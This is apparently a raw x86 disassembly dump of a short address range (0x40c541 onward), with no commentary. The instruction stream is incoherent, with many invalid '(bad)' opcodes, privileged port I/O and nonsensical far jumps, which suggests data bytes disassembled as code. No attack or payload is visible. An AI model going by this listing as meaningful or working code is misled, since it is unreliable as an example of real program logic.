  40c541:	or     eax,DWORD PTR [ebx+0x170f786e]
  40c547:	fbld   TBYTE PTR [ecx]
  40c549:	(bad)  
  40c54a:	jmp    0x40c56f
  40c54c:	inc    ebx
  40c54d:	push   esi
  40c54e:	je     0x40c5a1
  40c550:	pop    ebp
  40c551:	jp     0x40c5c1
  40c553:	punpcklbw mm5,DWORD PTR [edx+0x27fda40e]
  40c55a:	add    DWORD PTR [ecx-0x63116b7a],esi
  40c560:	lods   al,BYTE PTR ds:[esi]
  40c561:	mov    esi,0x381f80cc
  40c566:	push   0x298420b9
  40c56b:	cwde   
  40c56c:	test   al,0x8b
  40c56e:	in     al,dx
  40c56f:	lea    esi,[edi+0x13]
  40c572:	shl    BYTE PTR [esi-0x63dfc476],0xee
  40c579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c57a:	outs   dx,BYTE PTR ds:[esi]
  40c57b:	fiadd  DWORD PTR [ebx]
  40c57d:	mov    edx,0x4b44ac6d
  40c582:	or     edi,DWORD PTR [edx+0x9c231a]
  40c588:	ss out dx,al
  40c58a:	(bad)  
  40c58b:	stos   BYTE PTR es:[edi],al
  40c58c:	cmp    ecx,DWORD PTR [ecx+0xbfeddbd]
  40c592:	(bad)
  40c595:	int3   
  40c596:	jp     0x40c5d3
  40c598:	jge    0x40c525
  40c59a:	retf   0xecc0
  40c59d:	ficomp DWORD PTR [edx+0x571078c8]
  40c5a3:	ficomp WORD PTR [ecx-0x4dbcce93]
  40c5a9:	inc    ebp
  40c5aa:	xor    al,0x9a
  40c5ac:	push   ebx
  40c5ad:	mov    ah,0x74
  40c5af:	push   es
  40c5b0:	pop    ss
  40c5b1:	loopne 0x40c5a4
  40c5b3:	add    BYTE PTR [esi+eiz*1-0x80],al
  40c5b7:	mov    edi,0x74a2804b
  40c5bc:	xor    ebx,DWORD PTR [esi+edx*8]
  40c5bf:	das    
  40c5c0:	retf   
  40c5c1:	xlat   BYTE PTR ds:[ebx]
  40c5c2:	mov    al,0xf9
  40c5c4:	rcr    bh,0x46
  40c5c7:	push   esi
  40c5c8:	fcomp  DWORD PTR [ecx]
  40c5ca:	mov    cs,WORD PTR [edi]
  40c5cc:	fld    QWORD PTR [edx]
  40c5ce:	lea    edi,[edi]
  40c5d0:	dec    ebp
  40c5d1:	jmp    FWORD PTR [edx]
  40c5d3:	mov    ebx,0x1f852ea
  40c5d8:	mov    WORD PTR [edi+0x31c0ab15],cs
  40c5de:	lock sub eax,0x545c694b
  40c5e4:	pop    esp
  40c5e5:	sbb    dh,BYTE PTR [esi+0x7f2b33ad]
  40c5eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ec:	sub    cl,cl
  40c5ee:	outs   dx,DWORD PTR ds:[esi]
  40c5ef:	xchg   ebp,eax
  40c5f0:	add    al,0x33
  40c5f2:	outs   dx,BYTE PTR ds:[esi]
  40c5f3:	sbb    eax,0x8d720145
  40c5f8:	std    
  40c5f9:	(bad)
  40c5fc:	sub    BYTE PTR [eax],dh
  40c5fe:	loop   0x40c5b8
  40c600:	mov    esi,0xcac15aa
  40c605:	xchg   ecx,eax
  40c606:	push   ss
  40c607:	xlat   BYTE PTR ds:[ebx]
  40c608:	pop    edi
  40c609:	jge    0x40c656
  40c60b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c60c:	xchg   ebx,eax
  40c60d:	(bad)  
  40c60f:	pop    eax
  40c610:	outs   dx,DWORD PTR ds:[esi]
  40c611:	rol    cl,1
  40c613:	jb     0x40c5d7
  40c615:	inc    esi
  40c616:	and    ah,ch
  40c618:	fstp   QWORD PTR [ebx+0x44b2273c]
  40c61e:	cmc    
  40c61f:	sbb    edx,DWORD PTR [ecx+0x1b]
  40c622:	mov    ebp,0x9b78af49
  40c627:	sbb    BYTE PTR [esi+ecx*4+0x1be5245b],dh
  40c62e:	xchg   esi,eax
  40c62f:	jo     0x40c5fb
  40c631:	jg     0x40c5c0
  40c633:	push   esi
  40c634:	mov    ds:0x5af541cd,al
  40c639:	bound  ecx,QWORD PTR [ecx]
  40c63b:	call   DWORD PTR [eax]
  40c63d:	loopne 0x40c69e
  40c63f:	adc    ebp,ebx
  40c641:	push   ecx
  40c642:	push   edi
  40c643:	popa   
  40c644:	out    0xb3,al
  40c646:	pop    eax
  40c647:	lods   eax,DWORD PTR ds:[esi]
  40c648:	lock jmp 0xb99b:0x468b757e
  40c650:	jge    0x40c67c
  40c652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c653:	xor    eax,0x13d17787
  40c658:	xor    dh,BYTE PTR [ebx+0x1df5553a]
  40c65e:	xchg   ebx,eax
  40c65f:	ss inc ecx
  40c661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c662:	or     cl,BYTE PTR [ebx]
  40c664:	jg     0x40c6b0
  40c666:	popf   
  40c667:	and    bl,BYTE PTR [ecx-0x1d]
  40c66a:	daa    
  40c66b:	mov    ds:0xe51a4ba9,eax
  40c670:	adc    ebx,edi
  40c672:	mov    ah,BYTE PTR [eax-0x1c72de7d]
  40c678:	test   eax,0x1d685465
  40c67d:	dec    ebp
  40c67e:	in     al,0xe1
  40c680:	mov    eax,0x61183864
  40c685:	and    al,0x85
  40c687:	xchg   ebx,eax
  40c688:	xchg   BYTE PTR [esi+0x57],bh
  40c68b:	movups xmm5,xmm0
  40c68e:	dec    esi
  40c68f:	inc    edx
  40c690:	push   eax
  40c691:	and    al,0x9d
  40c693:	mov    ah,0x4d
  40c695:	push   ebx
  40c696:	push   eax
  40c697:	xlat   BYTE PTR ds:[ebx]
  40c698:	lods   al,BYTE PTR ds:[esi]
  40c699:	and    ecx,DWORD PTR [ebx]
  40c69b:	or     BYTE PTR [ecx+0x4238738],bl
  40c6a1:	add    ah,ch
  40c6a3:	dec    ebp
  40c6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a5:	sahf   
  40c6a6:	(bad)  
  40c6a7:	popa   
  40c6a8:	xor    eax,0x6e7d1013
  40c6ad:	daa    
  40c6ae:	mov    dl,0x95
  40c6b0:	int    0x1d
  40c6b2:	dec    eax
  40c6b3:	mov    ds:0xfe866e50,eax
  40c6b8:	sbb    edx,DWORD PTR [ecx+0x4461eb55]
  40c6be:	loopne 0x40c6a1
  40c6c0:	add    esp,DWORD PTR [ebx]
  40c6c2:	fild   QWORD PTR [ebp+0x60]
  40c6c5:	or     ch,ch
  40c6c7:	or     ebx,edx
  40c6c9:	(bad)  
  40c6ca:	mov    al,ds:0xfa09adbe
  40c6cf:	push   ds
  40c6d0:	add    DWORD PTR [edi-0x30],ecx
  40c6d3:	pop    ss
  40c6d4:	out    dx,al
  40c6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6d6:	add    al,0xd1
  40c6d8:	rcr    BYTE PTR [edi+0x364ccf57],0x56
  40c6df:	mov    ah,BYTE PTR [esi+0x1a]
  40c6e2:	(bad)  
  40c6e3:	and    dh,bl
  40c6e5:	sub    DWORD PTR [ebx],esp
  40c6e7:	int    0xe2
  40c6e9:	mov    al,ds:0xfffeeadd
  40c6ee:	gs daa 
  40c6f0:	sbb    DWORD PTR [ebx],edi
  40c6f2:	and    cl,ah
  40c6f4:	fsubr  DWORD PTR [ecx]
  40c6f6:	push   edx
  40c6f7:	jmp    0x40c684
  40c6f9:	aam    0xb4
  40c6fb:	fild   WORD PTR [ecx+0x1b]
  40c6fe:	inc    edx
  40c6ff:	mov    BYTE PTR ds:0x513545b8,al
  40c705:	ror    BYTE PTR [esi+0x60f05bc8],0x4
  40c70c:	lods   al,BYTE PTR ds:[esi]
  40c70d:	cmp    dh,BYTE PTR [edx-0x1ee61870]
  40c713:	dec    edx
  40c714:	mov    ah,0xb5
  40c716:	mov    esi,0xf0f78c7f
  40c71c:	mov    ds:0xa35df15a,al
  40c721:	dec    ebp
  40c722:	out    dx,al
  40c723:	push   ecx
  40c724:	dec    esi
  40c725:	adc    al,0x28
  40c727:	xor    eax,0x54142a38
  40c72c:	cmp    DWORD PTR [edi],esi
  40c72e:	jmp    0xea9:0x323676fe
  40c735:	imul   edi,DWORD PTR [edi-0x2826b00e],0x3f
  40c73c:	sub    ecx,DWORD PTR [eax+0x12d0f149]
  40c742:	add    ah,BYTE PTR [ebp+eax*8+0x7341ef37]
  40c749:	or     DWORD PTR [ebx-0x20],ecx
  40c74c:	dec    ebx
  40c74d:	sub    edi,DWORD PTR [esp+edi*2]
  40c750:	stc    
  40c751:	jmp    0x1689:0x7347abd1
  40c758:	out    0xcd,eax
  40c75a:	inc    esp
  40c75b:	adc    BYTE PTR [edi-0x3b],0xcb
  40c75f:	and    edi,ebx
  40c761:	mov    edx,0x1de30290
  40c766:	push   DWORD PTR [eax-0x26]
  40c769:	aam    0x53
  40c76b:	stos   BYTE PTR es:[edi],al
  40c76c:	mov    esp,0x2cbad518
  40c771:	and    ecx,ecx
  40c773:	loope  0x40c74c
  40c775:	rol    DWORD PTR [ecx],cl
  40c777:	fisubr WORD PTR [esi]
  40c779:	lods   al,BYTE PTR ds:[esi]
  40c77a:	pop    edx
  40c77b:	das    
  40c77c:	call   0x7334:0xd217d837
  40c783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c784:	loop   0x40c7e0
  40c786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c787:	icebp  
  40c788:	retf   0x7db2
  40c78b:	jmp    0xdb816fb8
  40c790:	(bad)  
  40c792:	out    0x22,eax
  40c794:	cdq    
  40c795:	(bad)  
  40c796:	and    al,0xcb
  40c798:	and    ch,BYTE PTR [esi-0x307c4b29]
  40c79e:	xor    DWORD PTR [edi],edi
  40c7a0:	lods   eax,DWORD PTR ds:[esi]
  40c7a1:	in     al,dx
  40c7a2:	std    
  40c7a3:	enter  0xeca8,0x32
  40c7a7:	imul   esi,DWORD PTR [eax+0x45],0xfcc53632
  40c7ae:	and    esi,ebx
  40c7b0:	mov    WORD PTR [esi*8-0x6f720565],ds
  40c7b7:	inc    eax
  40c7b8:	loop   0x40c7d6
  40c7ba:	xchg   esp,eax
  40c7bb:	adc    eax,0x9aa5f922
  40c7c0:	clc    
  40c7c1:	into   
  40c7c2:	inc    ebx
  40c7c3:	jecxz  0x40c745
  40c7c5:	push   cs
  40c7c6:	mov    bp,0xbdee
  40c7ca:	js     0x40c83e
  40c7cc:	jne    0x40c7fb
  40c7ce:	aas    
  40c7cf:	in     al,0xff
  40c7d1:	sbb    eax,0xd6b7b26c
  40c7d6:	rol    al,1
  40c7d8:	jno    0x40c832
  40c7da:	retf   0x5c24
  40c7dd:	je     0x40c811
  40c7df:	push   eax
  40c7e0:	sbb    al,0x60
  40c7e2:	js     0x40c78b
  40c7e4:	leave  
  40c7e5:	pushf  
  40c7e6:	aaa    
  40c7e7:	cli    
  40c7e8:	in     eax,0xb9
  40c7ea:	pop    ebx
  40c7eb:	ins    DWORD PTR es:[edi],dx
  40c7ec:	sar    BYTE PTR [eax-0x48],cl
  40c7ef:	mov    eax,0x4e6f281c
  40c7f4:	adc    al,0xda
  40c7f6:	fcmovb st,st(5)
  40c7f8:	mov    ebx,0x6a7305f8
  40c7fd:	shr    BYTE PTR [esi],0x79
  40c800:	popf   
  40c801:	push   edi
  40c802:	sbb    esi,esp
  40c804:	mov    gs,ecx
  40c806:	in     eax,dx
  40c807:	(bad)  
  40c808:	rcl    DWORD PTR [ecx-0x19fb44c4],1
  40c80e:	cli    
  40c80f:	mov    al,ds:0xa421328d
  40c814:	aas    
  40c815:	and    eax,0x8bd43ac8
  40c81a:	xor    bh,bl
  40c81c:	mov    esi,0x331b1a09
  40c821:	push   0xff7060fd
  40c826:	mov    edx,0xd6b592fa
  40c82b:	and    dl,BYTE PTR [edx+0x4e]
  40c82e:	add    ch,BYTE PTR [eax]
  40c830:	or     ch,BYTE PTR [eax]
  40c832:	icebp  
  40c833:	(bad)  
  40c834:	out    0x10,eax
  40c836:	pop    ebx
  40c837:	sub    BYTE PTR ds:0xb4084ed8,0x95
  40c83e:	xor    ah,BYTE PTR [edx-0x5d]
  40c841:	dec    esi
  40c842:	or     esi,0x4f
  40c845:	pop    eax
  40c846:	or     eax,ebp
  40c848:	and    BYTE PTR [esp+edi*1-0x36],cl
  40c84c:	mov    eax,ds:0x95db1563
  40c851:	xchg   DWORD PTR [ecx+0x1a6bcd5b],ecx
  40c857:	inc    ebp
  40c858:	(bad)  
  40c859:	jg     0x40c81e
  40c85b:	xchg   esi,eax
  40c85c:	loopne 0x40c85f
  40c85e:	xor    al,0x88
  40c860:	dec    eax
  40c861:	or     esp,DWORD PTR [esi+ecx*2]
  40c864:	xchg   ebx,eax
  40c865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c866:	loop   0x40c858
  40c868:	ins    DWORD PTR es:[edi],dx
  40c869:	jle    0x40c875
  40c86b:	xchg   ebp,eax
  40c86c:	mov    al,0x17
  40c86e:	cld    
  40c86f:	les    edi,FWORD PTR [esi+ebx*2+0x39]
  40c873:	xor    al,0x17
  40c875:	bound  edi,QWORD PTR [edi-0x3625db91]
  40c87b:	je     0x40c7fd
  40c87d:	pop    es
  40c87e:	pop    ss
  40c87f:	inc    esi
  40c880:	inc    esp
  40c881:	xor    BYTE PTR [edi],bl
  40c883:	stc    
  40c884:	lahf   
  40c885:	nop
  40c886:	addr16 cmp dh,dh
  40c889:	add    DWORD PTR [ebp-0x5b],esp
  40c88c:	sbb    cl,bh
  40c88e:	inc    esp
  40c88f:	out    dx,al
  40c890:	div    DWORD PTR [ebx+edx*4]
  40c893:	pop    eax
  40c894:	add    esi,DWORD PTR [esi]
  40c896:	dec    esp
  40c897:	mov    dl,BYTE PTR [edx-0x397b90f8]
  40c89d:	pop    ds
  40c89e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c89f:	das    
  40c8a0:	add    eax,0x792aed24
  40c8a5:	mov    ds:0xefd72ad8,al
  40c8aa:	mov    dh,0x87
  40c8ac:	pop    ss
  40c8ad:	jns    0x40c856
  40c8af:	mov    ds:0x88bd8ead,al
  40c8b4:	inc    edx
  40c8b5:	jb     0x40c8f7
  40c8b7:	mov    DWORD PTR [esi-0x15c36f13],edx
  40c8bd:	fsqrt  
  40c8bf:	mov    WORD PTR [edx+0x3d14f4f0],cs
  40c8c5:	pop    edi
  40c8c6:	fwait
  40c8c7:	mov    ah,0x83
  40c8c9:	mov    ah,0xa
  40c8cb:	scas   al,BYTE PTR es:[edi]
  40c8cc:	jecxz  0x40c918
  40c8ce:	mov    dl,0x46
  40c8d0:	or     dl,bl
  40c8d2:	xchg   esp,eax
  40c8d3:	shr    BYTE PTR [ebx-0x78d8f15b],cl
  40c8d9:	aam    0x4b
  40c8db:	mov    edx,0x37c0e2f0
  40c8e0:	out    dx,eax
  40c8e1:	je     0x40c91c
  40c8e3:	(bad)  
  40c8e5:	pop    eax
  40c8e6:	jmp    0x40c887
  40c8e8:	lahf   
  40c8e9:	ror    DWORD PTR [esi-0x63460f11],1
  40c8ef:	cdq    
  40c8f0:	out    0x2,eax
  40c8f2:	add    al,0x54
  40c8f4:	push   0x436bf5b0
  40c8f9:	mov    bl,0x32
  40c8fb:	clc    
  40c8fc:	inc    ecx
  40c8fd:	mov    cl,0x4e
  40c8ff:	inc    esp
  40c900:	aas    
  40c901:	sub    ah,dl
  40c903:	stos   DWORD PTR es:[edi],eax
  40c904:	cmc    
  40c905:	lea    ebp,[edi-0x26]
  40c908:	arpl   WORD PTR [ecx+0x4b],sp
  40c90b:	sbb    edx,eax
  40c90d:	mov    ebx,0x5f0cd4d7
  40c912:	(bad)  
  40c914:	inc    eax
  40c915:	cmp    ah,BYTE PTR [ebp-0x60]
  40c918:	dec    eax
  40c919:	int    0xba
  40c91b:	pop    esi
  40c91c:	xchg   DWORD PTR ds:0x5312fed6,esi
  40c922:	pushf  
  40c923:	cmp    DWORD PTR [eax+0x3b],0x11831ad0
  40c92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c92b:	sbb    al,0x86
  40c92d:	sbb    BYTE PTR [eax+eax*4],ah
  40c930:	sbb    DWORD PTR [eax-0x3c],ecx
  40c933:	call   0xa839:0x7256171a
  40c93a:	add    al,0xe3
  40c93c:	sub    BYTE PTR [ebp-0x27],al
  40c93f:	mov    fs,ebx
  40c941:	and    eax,0x1dbaf159
  40c946:	push   ebx
  40c947:	dec    ecx
  40c948:	mov    eax,0x2da3203
  40c94d:	mov    BYTE PTR [ebx+eiz*1],al
  40c950:	out    0x35,al
  40c952:	add    edi,ebx
  40c954:	mov    ds:0xa7d8104e,al
  40c959:	repnz fs push esp
  40c95c:	test   DWORD PTR fs:[ebp+0x4],ebx
  40c960:	into   
  40c961:	add    al,0x1c
  40c963:	jnp    0x40c920
  40c965:	repnz (bad) 
  40c967:	pop    ds
  40c968:	shl    al,1
  40c96a:	lods   eax,DWORD PTR ds:[esi]
  40c96b:	into   
  40c96c:	sub    BYTE PTR [ebx+0x58],0x25
  40c970:	xor    edx,ebx
  40c972:	pop    ss
  40c973:	sahf   
  40c974:	adc    DWORD PTR [edx],ecx
  40c976:	pop    ss
  40c977:	movhps QWORD PTR [bp+si+0xf],xmm6
  40c97c:	push   cs
  40c97d:	popa   
  40c97e:	je     0x40c928
  40c980:	dec    edx
  40c981:	mov    edi,0x147771e1
  40c986:	mov    ds:0x6a0c1f43,eax
  40c98b:	mov    ah,0x6f
  40c98d:	iret   
  40c98e:	jle    0x40c9df
  40c990:	mov    ebp,0xecfd75dd
  40c995:	repz aaa 
  40c997:	mov    ah,0xdc
  40c999:	xor    eax,0xabfbc352
  40c99e:	mov    ds:0x7d2a6080,eax
  40c9a3:	sub    eax,0xca72b745
  40c9a8:	retf   0xcbf0
  40c9ab:	lds    ebx,FWORD PTR [edi]
  40c9ad:	xchg   ebp,eax
  40c9ae:	fcmovbe st,st(1)
  40c9b0:	fcmove st,st(5)
  40c9b2:	inc    eax
  40c9b3:	test   al,0x64
  40c9b5:	cmp    bl,BYTE PTR [ebp-0x78d90b63]
  40c9bb:	xchg   DWORD PTR [edx+0x7d],ebx
  40c9be:	inc    esi
  40c9bf:	gs dec eax
  40c9c1:	repnz or dh,al
  40c9c4:	cld    
  40c9c5:	pop    edx
  40c9c6:	out    0x1c,eax
  40c9c8:	imul   esp,esi,0xffffffbf
  40c9cb:	test   BYTE PTR [ebx+0x4d],al
  40c9ce:	aaa    
  40c9cf:	mov    ebx,0xfed1c98b
  40c9d4:	inc    esp
  40c9d5:	aam    0x28
  40c9d7:	stc    
  40c9d8:	cmp    eax,0x88f7553d
  40c9dd:	(bad)  
  40c9de:	lahf   
  40c9df:	cmp    eax,0xf21ec9a0
  40c9e4:	or     eax,0xd668f21f
  40c9e9:	pop    eax
  40c9ea:	mov    esp,DWORD PTR [edi+eiz*1-0x28]
  40c9ee:	sbb    al,0x3
  40c9f0:	sub    eax,0xa7d1be09
  40c9f5:	or     BYTE PTR [esi],bl
  40c9f7:	ins    BYTE PTR es:[edi],dx
  40c9f8:	stos   BYTE PTR es:[edi],al
  40c9f9:	out    0x2d,al
  40c9fb:	push   cs
  40c9fc:	adc    BYTE PTR [ecx],bh
  40c9fe:	mov    eax,ds:0x14f08f7a
  40ca03:	das    
  40ca04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca05:	sub    DWORD PTR [edi+0x5d],edi
  40ca08:	xor    al,0x85
  40ca0a:	jbe    0x40ca49
  40ca0c:	sar    ebp,1
  40ca0e:	sahf   
  40ca0f:	dec    edi
  40ca10:	mov    edi,0x7a85c75
  40ca15:	out    dx,al
  40ca16:	xor    bl,BYTE PTR [ebx+0x34]
  40ca19:	ja     0x40ca5f
  40ca1b:	mov    al,0x90
  40ca1d:	stos   BYTE PTR es:[edi],al
  40ca1e:	imul   ebp,DWORD PTR [edx],0x20678cbb
  40ca24:	or     DWORD PTR ds:0x71a3cac3,ecx
  40ca2a:	loop   0x40c9ee
  40ca2c:	clc    
  40ca2d:	sub    DWORD PTR ds:0xc4031978,ecx
  40ca33:	and    al,BYTE PTR [edi-0x3a46f649]
  40ca39:	cmp    al,cl
  40ca3b:	mov    WORD PTR [bx-0xd],?
  40ca3f:	pop    esp
  40ca40:	jp     0x40ca66
  40ca42:	std    
  40ca43:	lds    esp,FWORD PTR [ecx-0x61]
  40ca46:	cli    
  40ca47:	cmp    al,0x6
  40ca49:	sub    ah,bh
  40ca4b:	(bad)  
  40ca4c:	push   ss
  40ca4d:	leave  
  40ca4e:	in     eax,dx
  40ca4f:	leave  
  40ca50:	cs std 
  40ca52:	clc    
  40ca53:	and    ebp,DWORD PTR [esi-0x6c]
  40ca56:	mov    ebp,0xed59c577
  40ca5b:	cmc    
  40ca5c:	std    
  40ca5d:	jbe    0x40ca1e
  40ca5f:	scas   eax,DWORD PTR es:[edi]
  40ca60:	lods   eax,DWORD PTR ds:[esi]
  40ca61:	fild   DWORD PTR [ecx]
  40ca63:	or     eax,0xd225f244
  40ca68:	shl    BYTE PTR [eax+eax*4-0x2a0b6b41],0xae
  40ca70:	retf   
  40ca71:	fistp  QWORD PTR [ebx+0x2]
  40ca74:	repz cmp eax,0xe967692e
  40ca7a:	pop    ds
  40ca7b:	je     0x40ca7c
  40ca7d:	popf   
  40ca7e:	imul   BYTE PTR [esi+0x5e]
  40ca81:	fsubp  st(7),st
  40ca83:	mov    eax,0xa8595e41
  40ca88:	in     eax,dx
  40ca89:	(bad)  
  40ca8a:	enter  0xdd3f,0x2
  40ca8e:	xor    eax,0x8ff7e903
  40ca93:	or     eax,0x846b9642
  40ca98:	pop    ecx
  40ca99:	dec    edi
  40ca9a:	jge    0x40ca96
  40ca9c:	push   0x20
  40ca9e:	ror    BYTE PTR [ecx+0x3],1
  40caa1:	or     edi,eax
  40caa3:	inc    ebx
  40caa4:	jmp    0x40ca4e
  40caa6:	es popf 
  40caa8:	jmp    0x40caa3
  40caaa:	sub    edx,edi
  40caac:	call   0xe0d20428
  40cab1:	into   
  40cab2:	push   ds
  40cab3:	push   ss
  40cab4:	fisubr DWORD PTR [ebp-0x57e986f5]
  40caba:	dec    edi
  40cabb:	cmp    esi,DWORD PTR [eax]
  40cabd:	pop    esp
  40cabe:	xor    DWORD PTR [eax+eax*2+0x17],esp
  40cac2:	outs   dx,DWORD PTR ds:[esi]
  40cac3:	or     eax,0x123ca437
  40cac8:	enter  0xd3f8,0x54
  40cacc:	sub    cl,dl
  40cace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cacf:	inc    edi
  40cad0:	jo     0x40cb38
  40cad2:	shl    BYTE PTR [ebp+ebp*1+0x34],0xae
  40cad7:	sbb    al,0x18
  40cad9:	add    al,0x69
  40cadb:	sub    eax,0x67cfda54
  40cae0:	outs   dx,BYTE PTR ds:[esi]
  40cae1:	sti    
  40cae2:	inc    esi
  40cae3:	imul   edx,DWORD PTR ds:0x82445d0f,0x65
  40caea:	inc    ebx
  40caeb:	jmp    0xf2f2:0x7154fd73
  40caf2:	adc    BYTE PTR [edx],bl
  40caf4:	mov    bl,0xf5
  40caf6:	pop    edi
  40caf7:	push   ebx
  40caf8:	or     bh,BYTE PTR [eax+0x14]
  40cafb:	push   eax
  40cafc:	add    BYTE PTR [ebx],bh
  40cafe:	lds    ebp,FWORD PTR [ebx-0x1c156c2]
  40cb04:	mov    al,0xcd
  40cb06:	mov    bl,0x60
  40cb08:	in     al,dx
  40cb09:	jle    0x40cac0
  40cb0b:	test   BYTE PTR [ebp+0x4d],ch
  40cb0e:	jae    0x40cb84
  40cb10:	into   
  40cb11:	jae    0x40cb40
  40cb13:	mov    ecx,0x5a8d63e9
  40cb18:	jne    0x40cb54
  40cb1a:	push   ss
  40cb1b:	je     0x40cb45
  40cb1d:	dec    edx
  40cb1e:	xor    al,0x1b
  40cb20:	scas   al,BYTE PTR es:[edi]
  40cb21:	imul   DWORD PTR [edi+0x27d59f9d]
  40cb27:	je     0x40cb1d
  40cb29:	push   ss
  40cb2a:	inc    ebx
  40cb2b:	iret   
  40cb2c:	(bad)  
  40cb2d:	enter  0xd9be,0xcc
  40cb31:	test   eax,0x79387d80
  40cb36:	fistp  QWORD PTR [edi+0x34]
  40cb39:	ins    BYTE PTR es:[edi],dx
  40cb3a:	jmp    0x40cb59
  40cb3c:	stc    
  40cb3d:	aas    
  40cb3e:	push   ebp
  40cb3f:	add    dh,BYTE PTR [esi+0x7d]
  40cb42:	mov    eax,ds:0xa58ea635
  40cb47:	push   es
  40cb48:	adc    al,0xbb
  40cb4a:	and    ebx,ecx
  40cb4c:	in     eax,0xa7
  40cb4e:	push   cs
  40cb4f:	xchg   esi,eax
  40cb50:	sbb    al,0x63
  40cb52:	test   cl,ch
  40cb54:	pop    esp
  40cb55:	add    esp,ebx
  40cb57:	inc    edi
  40cb58:	dec    ecx
  40cb59:	nop
  40cb5a:	add    al,ch
  40cb5c:	pop    ecx
  40cb5d:	dec    eax
  40cb5e:	out    dx,al
  40cb5f:	xor    al,BYTE PTR [edi+eax*4+0x29]
  40cb63:	push   0x38
  40cb65:	pushf  
  40cb66:	inc    edx
  40cb67:	sbb    DWORD PTR [edx-0x3d],esi
  40cb6a:	jb     0x40cbc2
  40cb6c:	test   al,0xb0
  40cb6e:	sub    DWORD PTR [edx+0x45],eax
  40cb71:	scas   al,BYTE PTR es:[edi]
  40cb72:	pop    edi
  40cb73:	xchg   DWORD PTR [ecx+0x39],eax
  40cb76:	dec    ebx
  40cb77:	aas    
  40cb78:	dec    ecx
  40cb79:	adc    BYTE PTR [edi],ch
  40cb7b:	xor    BYTE PTR [ebx+0x41ae6116],bl
  40cb81:	imul   esi,ebx,0xcca23f08
  40cb87:	paddw  mm1,QWORD PTR [ebp+0x49324d51]
  40cb8e:	jl     0x40cb16
  40cb90:	(bad)  
  40cb91:	jbe    0x40cbf7
  40cb93:	inc    edi
  40cb94:	jp     0x40cb20
  40cb96:	lahf   
  40cb97:	or     ebp,edx
  40cb99:	(bad)  
  40cb9a:	inc    ecx
  40cb9b:	push   0x5a85b20a
  40cba0:	xchg   ecx,eax
  40cba1:	pop    ebp
  40cba2:	test   dh,0x3
  40cba5:	jbe    0x40cbac
  40cba7:	mov    BYTE PTR [esi+0x4a],dl
  40cbaa:	inc    edx
  40cbab:	add    ebp,DWORD PTR [edi]
  40cbad:	ret    
  40cbae:	rol    DWORD PTR [ebx+0x29],cl
  40cbb1:	int    0x32
  40cbb3:	stos   DWORD PTR es:[edi],eax
  40cbb4:	add    cl,BYTE PTR [ecx-0x5f]
  40cbb7:	lock and ecx,eax
  40cbba:	(bad)  
  40cbbd:	xchg   ecx,eax
  40cbbe:	stos   DWORD PTR es:[edi],eax
  40cbbf:	mov    cl,0xc9
  40cbc1:	mov    dl,0x99
  40cbc3:	js     0x40cb5e
  40cbc5:	sbb    al,BYTE PTR [ebp-0x6842d406]
  40cbcb:	loopne 0x40cb55
  40cbcd:	xor    al,0xf6
  40cbcf:	add    dh,BYTE PTR [ecx+0x4a29d850]
  40cbd5:	jecxz  0x40cbe2
  40cbd7:	sub    al,0xbe
  40cbd9:	pusha  
  40cbda:	push   ss
  40cbdb:	xchg   BYTE PTR [edi],ch
  40cbdd:	shl    DWORD PTR [edi-0x14053e93],cl
  40cbe3:	pusha  
  40cbe4:	aas    
  40cbe5:	dec    esp
  40cbe6:	pop    ecx
  40cbe7:	push   ss
  40cbe8:	(bad)  [ecx+ebp*8+0x23]
  40cbec:	shl    bh,1
  40cbee:	hlt    
  40cbef:	pop    es
  40cbf0:	or     DWORD PTR [ecx+0x6972153],ecx
  40cbf6:	xor    al,0x79
  40cbf8:	pop    ebp
  40cbf9:	inc    esi
  40cbfa:	mov    eax,0xf439de81
  40cbff:	lahf   
  40cc00:	jmp    0xf146:0xdf3d297d
  40cc07:	icebp  
  40cc08:	mov    eax,ds:0x5d50e716
  40cc0d:	das    
  40cc0e:	iret   
  40cc0f:	sub    ah,bh
  40cc11:	test   DWORD PTR [esi+0x3],edx
  40cc14:	mov    esi,0x3d9ed684
  40cc19:	test   al,bh
  40cc1b:	cs adc edx,0xffffffe4
  40cc1f:	ret    
  40cc20:	inc    eax
  40cc21:	xchg   ebp,eax
  40cc22:	push   cs
  40cc23:	mov    ah,0x85
  40cc25:	das    
  40cc26:	rcr    bl,0x49
  40cc29:	fmul   DWORD PTR [ebp-0xe]
  40cc2c:	lods   al,BYTE PTR ds:[esi]
  40cc2d:	sbb    DWORD PTR [edi],ebp
  40cc2f:	xchg   ebx,eax
  40cc30:	lahf   
  40cc31:	and    al,0x2e
  40cc33:	call   0xeae7:0xf013445a
  40cc3a:	push   ebx
  40cc3b:	xchg   ebx,eax
  40cc3c:	mov    dl,0x77
  40cc3e:	sbb    al,BYTE PTR [edx-0x16]
  40cc41:	add    eax,0x998f96f8
  40cc46:	jmp    0xac606ba5
  40cc4b:	push   ebx
  40cc4c:	in     al,0xb
  40cc4e:	imul   bl
  40cc50:	inc    esp
  40cc51:	stos   DWORD PTR es:[edi],eax
  40cc52:	or     eax,0x1f98ffbe
  40cc57:	mov    ebp,0x59bf7f19
  40cc5c:	popf   
  40cc5d:	lods   eax,DWORD PTR ds:[esi]
  40cc5e:	mov    DWORD PTR [edi-0x1700d33d],0x3e94b37f
  40cc68:	pop    ebx
  40cc69:	std    
  40cc6a:	arpl   WORD PTR [ebx+ebx*8+0x2fbddc62],di
  40cc71:	popf   
  40cc72:	in     eax,0xa1
  40cc74:	loop   0x40cc5c
  40cc76:	inc    ebx
  40cc77:	ror    esi,1
  40cc79:	mov    ds:0xc99b5855,al
  40cc7e:	inc    edi
  40cc7f:	adc    dl,bl
